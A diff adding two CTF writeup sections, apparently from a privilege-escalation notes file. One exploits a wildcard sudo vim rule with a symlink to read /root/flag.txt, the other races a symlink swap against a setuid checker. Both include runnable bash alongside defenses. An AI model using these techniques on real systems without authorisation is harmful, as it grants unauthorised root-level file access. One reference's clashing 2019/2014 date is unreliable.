@@ -19,6 +19,8 @@ Techniques from HackTheBox machine writeups covering sudo abuse, service misconf
 - [WinSSHTerm Encrypted Credential Decryption (Atlas HTB)](#winsshterm-encrypted-credential-decryption-atlas-htb)
 - [sudo file -m Magic File Directory Traversal (OTW Advent 2018)](#sudo-file--m-magic-file-directory-traversal-otw-advent-2018)
 - [CVE-2018-19788 — polkit UID Integer Overflow → Systemd RCE (OTW Advent 2018)](#cve-2018-19788--polkit-uid-integer-overflow--systemd-rce-otw-advent-2018)
+- [Sudo Glob Path + Symlink Confused Deputy via vim (STEM CTF 2019)](#sudo-glob-path--symlink-confused-deputy-via-vim-stem-ctf-2019)
+- [TOCTOU Symlink Swap Race on FileChecker (STEM CTF 2019)](#toctou-symlink-swap-race-on-filechecker-stem-ctf-2019)
 
 ---
 
@@ -284,3 +286,48 @@ cat /tmp/out
 **Key insight:** Any integer-based permission check that compares with signed integers breaks for UID > INT_MAX. The patched version of polkit treats invalid UIDs as `root`'s opposite — *always deny*. Remembering the numeric constant 4020181224 lets you spot vulnerable boxes immediately.
 
 **References:** OverTheWire Advent Bonanza 2018 — writeup 12764
+
+---
+
+## Sudo Glob Path + Symlink Confused Deputy via vim (STEM CTF 2019)
+
+**Pattern:** `/etc/sudoers` grants vim on a glob path — `ctf ALL=(root) NOPASSWD: /usr/bin/vim /home/ctf/*/*/HackMe2.txt`. The glob constrains the *pathname*, not the *file it refers to*. Create any matching path as a symlink to `/root/flag.txt` and vim will happily dereference it and open the real target with root privileges.
+
+```bash
+# Set up directory tree that matches /home/ctf/*/*/HackMe2.txt
+mkdir -p ~/a/b
+ln -s /root/flag.txt ~/a/b/HackMe2.txt
+
+# sudo resolves the pathname string, but open() follows the symlink
+sudo /usr/bin/vim /home/ctf/a/b/HackMe2.txt
+# :!cat % inside vim prints /root/flag.txt contents
+```
+
+**Key insight:** Sudoers path matching happens on the literal argv string, but the binary itself dereferences symlinks. Any "edit only this file" sudo rule that uses a wildcard is exploitable this way — not just vim (also `less`, `cat`, `head`, `tail`, `cp`, `chmod`, `truncate`, any tool that open()s the path). Defense requires `secure_path`, absolute paths without globs, and ideally a file-reading helper that calls `realpath()` and checks against an allow-list.
+
+**References:** STEM CTF: Cyber Challenge 2019 — January 8 2014, writeup 13301
+
+---
+
+## TOCTOU Symlink Swap Race on FileChecker (STEM CTF 2019)
+
+**Pattern:** A setuid binary checks a path's ownership/permissions with `stat()` and only then `open()`s it (or vice versa) — the classic Time-Of-Check / Time-Of-Use window. Run two tight loops in parallel: one rapidly alternates a symlink between a dummy file (that passes the check) and `/root/flag.txt` (that the attacker cannot read), the other invokes the checker and greps for the flag marker. Eventually the two line up and the checker reads the flag while it passed validation on the dummy.
+
+```bash
+# redirect.sh — swap the symlink forever
+while true; do
+    ln -sf dummy.txt link
+    ln -sf /root/flag.txt link
+done &
+
+# runfile.sh — hammer the vulnerable binary; print when it leaks MCA{
+while true; do
+    ./FileChecker link 2>/dev/null | grep -m1 'MCA{' && break
+done
+```
+
+Run them concurrently in the same shell (`./redirect.sh &` then `./runfile.sh`) and wait — usually a few seconds to a minute. Tighten the race with `renameat2(RENAME_EXCHANGE)` or a userfaultfd/inotify-synced swap if the loop is too slow.
+
+**Key insight:** Any two-syscall access pattern on a path (e.g. `stat()` then `open()`, `access()` then `fopen()`) is racey. `access(2)` in particular is explicitly documented as unsafe for security decisions. Defense uses `openat()` + `fstat()` on the returned fd, or `O_NOFOLLOW` to reject symlinks entirely. As an attacker, flip the symlink at ~1M ops/sec with a bash loop or a C program using `renameat2`.
+
+**References:** STEM CTF: Cyber Challenge 2019 — Race You, writeup 13376
